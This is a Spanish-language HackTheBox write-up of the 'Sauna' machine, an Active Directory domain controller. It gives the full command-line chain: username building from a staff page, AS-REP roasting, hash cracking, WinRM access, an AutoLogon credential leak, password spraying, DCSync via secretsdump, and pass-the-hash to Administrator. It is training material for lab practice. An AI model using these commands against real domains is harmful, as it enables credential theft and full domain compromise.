---
icon: windows
tags:
  - active-directory
  - kerberos
  - dcsync
  - pass-the-hash
  - cracking
  - asreproasting
---

# Sauna

### Resumen

#### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Sauna         |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 16/11/2026    |
| **IP Objetivo**       | 10.129.95.180 |

#### Executive Summary

La máquina **Sauna** es un Controlador de Dominio de Active Directory (`EGOTISTICAL-BANK.LOCAL`). La web corporativa expuesta en el puerto 80 filtraba en una página "Meet the Team" los nombres completos de los empleados, lo que permitió construir una lista de nombres de usuario siguiendo las convenciones habituales de AD (`nombre.apellido`, `n.apellido`, etc.).

Contra esa lista se realizó AS-REP Roasting sin autenticar: el usuario `FSmith` tenía desactivada la preautenticación Kerberos, lo que permitió obtener y crackear offline su hash, revelando la contraseña `Thestrokes23`. Con acceso como `FSmith` se enumeraron los usuarios del dominio y, ejecutando WinPEAS, se encontró una credencial de inicio de sesión automático (AutoLogon) guardada en el registro para la cuenta de servicio `svc_loanmgr`.

Un spray de las contraseñas conocidas confirmó además la reutilización de `Thestrokes23` en la cuenta `HSmith`. Con `svc_loanmgr` se obtuvo acceso por WinRM (a diferencia de `HSmith`, que no pertenece al grupo de gestión remota) y, enumerando con BloodHound, se confirmó que esta cuenta tenía derechos de **DCSync** sobre el dominio. Se extrajeron todos los hashes NTLM del dominio, incluido el del Administrador, con el que se accedió mediante Pass-the-Hash.

**Impacto:** compromiso total del dominio, por exposición de información de empleados en la web pública, una cuenta sin preautenticación Kerberos, reutilización de contraseñas y una cuenta de servicio con privilegios de DCSync innecesarios.

#### Técnicas

* Information Disclosure (nombres de empleados en la web)
* Construcción de diccionario de usuarios por convención de nombres de AD
* AS-REP Roasting (sin autenticar)
* Cracking de hash offline (hashcat)
* Credential Reuse / Password Spraying
* Information Disclosure — credencial de AutoLogon en el registro (WinPEAS)
* Abuso de derechos DCSync sobre el dominio
* Pass-the-Hash

### Information Gathering

#### Port Scanning

**TCP**

```bash
> sudo nmap -sS -Pn -n -vv -p- 10.129.95.180 -oG allPorts
> nmap -sCV -Pn -n -v -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49680,49692,49701 10.129.95.180
```

| Puerto   | Servicio     | Versión                                                |
| -------- | ------------ | ------------------------------------------------------ |
| 53/tcp   | domain       | Simple DNS Plus                                        |
| 80/tcp   | http         | Microsoft IIS httpd 10.0                               |
| 88/tcp   | kerberos-sec | Microsoft Windows Kerberos                             |
| 135/tcp  | msrpc        | Microsoft Windows RPC                                  |
| 139/tcp  | netbios-ssn  | Microsoft Windows netbios-ssn                          |
| 389/tcp  | ldap         | Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL) |
| 445/tcp  | microsoft-ds | —                                                      |
| 464/tcp  | kpasswd5     | —                                                      |
| 593/tcp  | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0                    |
| 3268/tcp | ldap         | Active Directory LDAP (Global Catalog)                 |
| 5985/tcp | http         | Microsoft HTTPAPI httpd 2.0 (WinRM)                    |
| 9389/tcp | mc-nmf       | .NET Message Framing (AD Web Services)                 |

Confirmado Domain Controller (hostname `SAUNA`) del dominio `EGOTISTICAL-BANK.LOCAL`, con un sitio web corporativo (IIS) en el puerto 80.

#### Enumeration

**SMB**

```bash
> nxc smb 10.129.95.180 -u '' -p ''
```

Se permite NULL Auth, pero ni `--rid-brute` ni `--shares` devuelven nada (`STATUS_ACCESS_DENIED`). La cuenta `Guest` está deshabilitada (`STATUS_ACCOUNT_DISABLED`), por lo que la vía SMB para enumerar usuarios queda cerrada en este punto.

**Web**

Un escaneo de nombres cortos IIS (`iis_shortname_scanner.py`) reveló rutas ocultas, entre ellas `/egotis~1` (403) y varios ficheros. Navegando manualmente por el sitio, `/about.html` exponía una página "Meet the Team" con los nombres completos de los empleados:



<figure><img src="../../../.gitbook/assets/about.html — nombres de empleados expuestos (1).png" alt="" width="563"><figcaption></figcaption></figure>

_about.html — nombres de empleados expuestos_

* Fergus Smith
* Hugo Bear
* Steven Kerb
* Shaun Coins
* Bowie Taylor
* Sophie Driver

A partir de estos nombres se construyó un diccionario de usuarios probando las convenciones habituales de Active Directory (`nombre.apellido`, `n.apellido`, `nombrea`, etc.), para usar contra Kerberos.

### Explotación

#### Foothold

* **Vulnerabilidad:** Cuenta de dominio sin preautenticación Kerberos requerida (AS-REP Roasting).
* **Exploit:** `GetNPUsers.py`, `hashcat`.
* **Procedimiento:**

1. Se lanzó AS-REP Roasting sin autenticar contra el diccionario de usuarios generado:

```bash
> impacket-GetNPUsers -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt
```

<figure><img src="../../../.gitbook/assets/GetNPUsers hash AS-REP obtenido para fsmith (1).png" alt=""><figcaption></figcaption></figure>

_GetNPUsers: hash AS-REP obtenido para fsmith_

El usuario `fsmith` no tenía preautenticación Kerberos requerida, lo que permitió obtener su hash `$krb5asrep$23$...` sin necesidad de credenciales.

2. El hash se crackeó offline:

```bash
> hashcat krb5-hash-fsmith.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
```

3. Acceso por WinRM y lectura de la flag de usuario:

```bash
> evil-winrm -i 10.129.95.180 -u 'fsmith' -p 'Thestrokes23'
```

* **Evidencia:** (`user.txt`)

<figure><img src="../../../.gitbook/assets/Lectura de user.txt como FSmith (1).png" alt="" width="563"><figcaption></figcaption></figure>

_Lectura de user.txt como FSmith_

#### Privesc

* **Vulnerabilidad:** Reutilización de contraseñas + credencial de AutoLogon expuesta en el registro + derechos de DCSync concedidos a una cuenta de servicio.
* **Exploit:** `winPEAS`, `nxc` (password spray), BloodHound, `secretsdump.py` (DCSync).
* **Procedimiento:**

1. Con acceso como `fsmith`, se enumeraron los usuarios del dominio vía SMB, confirmando las cuentas reales:

```bash
> nxc smb 10.129.95.180 -u 'fsmith' -p 'Thestrokes23' --users

Administrator
Guest
krbtgt
HSmith
FSmith
svc_loanmgr
```

2. Ejecutando `winPEAS` en la sesión de `fsmith` se encontró una credencial de inicio de sesión automático guardada en el registro (Winlogon):

```
DefaultDomainName : EGOTISTICALBANK
DefaultUserName   : EGOTISTICALBANK\svc_loanmanager
DefaultPassword   : Moneymakestheworldgoround!
```

3. Con las dos contraseñas conocidas (`Thestrokes23` y `Moneymakestheworldgoround!`) se hizo spray contra la lista de usuarios, confirmando reutilización de `Thestrokes23` en `hsmith`:

```bash
> nxc smb 10.129.95.180 -u users.txt -p passwords.txt
```

![Credencial válida: hsmith:Thestrokes23](<../../../.gitbook/assets/Credencial válida hsmithThestrokes23 (1).png>)&#x20;

_Credencial válida: hsmith:Thestrokes23_&#x20;

<div align="left"><figure><img src="../../../.gitbook/assets/Credencial válida svc_loanmgrMoneymakestheworldgoround! (1).png" alt="" width="300"><figcaption></figcaption></figure></div>

_Credencial válida: svc\_loanmgr:Moneymakestheworldgoround!_

4. Se comprobó el acceso por WinRM de ambas cuentas: `svc_loanmgr` sí tiene sesión remota (`Pwn3d!`), `hsmith` no pertenece al grupo de gestión remota y no puede:

```bash
> nxc winrm 10.129.95.180 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

&#x20;

<figure><img src="../../../.gitbook/assets/svc_loanmgr válido por WinRM (Pwn3d!) (1).png" alt=""><figcaption></figcaption></figure>

_svc\_loanmgr válido por WinRM (Pwn3d!)_

```bash
> nxc winrm 10.129.95.180 -u 'hsmith' -p 'Thestrokes23'
```

![hsmith: credencial válida pero sin acceso WinRM](<../../../.gitbook/assets/hsmith credencial válida pero sin acceso WinRM (1).png>)&#x20;

_hsmith: credencial válida pero sin acceso WinRM_

5. Acceso como `svc_loanmgr` y recolección de datos de AD con SharpHound:

```bash
> evil-winrm -i 10.129.95.180 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

```powershell
PS> .\SharpHound.exe -c All
PS> download "C:/users/svc_loanmgr/Desktop/20261116192935_BloodHound.zip"
```

BloodHound reveló que `svc_loanmgr` tiene derechos de **DCSync** sobre el dominio `EGOTISTICAL-BANK.LOCAL`:

&#x20;

<figure><img src="../../../.gitbook/assets/BloodHound svc_loanmgr con DCSync sobre el dominio (1).png" alt=""><figcaption></figcaption></figure>

_BloodHound: svc\_loanmgr con DCSync sobre el dominio_

6. Se abusó del derecho de DCSync para extraer todos los hashes del dominio:

```bash
> secretsdump.py -dc-ip 10.129.95.180 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!'@10.129.95.180
```

<figure><img src="../../../.gitbook/assets/secretsdump hashes NTLM del dominio, incluido Administrator (1).png" alt=""><figcaption></figcaption></figure>

&#x20;_secretsdump: hashes NTLM del dominio, incluido Administrator_

El volcado confirmó también que `HSmith` y `FSmith` comparten el mismo hash NTLM, validando la reutilización de contraseña detectada antes.

7. Acceso como `Administrator` mediante Pass-the-Hash y lectura de la flag de root:

```bash
> evil-winrm -i 10.129.95.180 -u "administrator" -H "823452073d75b9d1cf70ebdf86c7f98e"
```

* **Evidencia:** (`root.txt`)

<figure><img src="../../../.gitbook/assets/Acceso como Administrator por Pass-the-Hash y lectura de root.txt (2).png" alt=""><figcaption></figcaption></figure>

_Acceso como Administrator por Pass-the-Hash y lectura de root.txt_

***

#### Notes

* Convención de nombres de usuario de AD observada en esta máquina, útil como checklist para futuras enumeraciones a partir de nombre y apellido: `nombre.apellido`, `nombre`, `apellido`, `n.apellido`, `nombre.a`, `napellido`, `nombrea`.
